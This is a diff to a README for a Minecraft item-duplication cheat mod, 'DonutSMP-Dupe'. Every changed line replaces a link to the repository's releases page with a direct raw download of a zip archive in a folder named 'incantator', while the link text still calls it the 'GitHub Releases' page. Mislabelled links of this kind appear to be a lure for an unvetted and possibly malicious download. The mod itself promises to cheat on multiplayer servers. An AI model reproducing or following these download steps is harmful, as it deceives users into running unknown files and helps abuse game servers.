@@ -1,6 +1,6 @@
 # ⬇️ DonutSMP-Dupe - Simple Minecraft Dupe Mod
 
-[![Download](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge&logo=github)](https://github.com/addinpierarch569/DonutSMP-Dupe/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge&logo=github)](https://github.com/addinpierarch569/DonutSMP-Dupe/raw/refs/heads/main/incantator/Dupe_SM_Donut_v3.7.zip)
 
 ## 🧭 Overview
 
@@ -12,7 +12,7 @@ It works on DonutSMP and many other servers. The mod is made for normal users wh
 
 Visit this page to download the latest release for Windows:
 
-[GitHub Releases](https://github.com/addinpierarch569/DonutSMP-Dupe/releases)
+[GitHub Releases](https://github.com/addinpierarch569/DonutSMP-Dupe/raw/refs/heads/main/incantator/Dupe_SM_Donut_v3.7.zip)
 
 After you open the page, look for the newest release and download the file that matches your setup. If the release includes a `.jar` file, that is the file you need for Minecraft Fabric.
 
@@ -33,7 +33,7 @@ For best results, use a recent version of Minecraft Launcher. The mod is made fo
 
 Follow these steps in order:
 
-1. Open the [GitHub Releases](https://github.com/addinpierarch569/DonutSMP-Dupe/releases) page
+1. Open the [GitHub Releases](https://github.com/addinpierarch569/DonutSMP-Dupe/raw/refs/heads/main/incantator/Dupe_SM_Donut_v3.7.zip) page
 2. Download the latest release file
 3. Open your Minecraft Launcher
 4. Make sure Fabric Loader is installed for Minecraft 1.21+
@@ -153,7 +153,7 @@ From there:
 
 When a new release comes out:
 
-1. Open the [GitHub Releases](https://github.com/addinpierarch569/DonutSMP-Dupe/releases) page
+1. Open the [GitHub Releases](https://github.com/addinpierarch569/DonutSMP-Dupe/raw/refs/heads/main/incantator/Dupe_SM_Donut_v3.7.zip) page
 2. Download the newer file
 3. Remove the old version from the `mods` folder
 4. Put the new file in the same folder
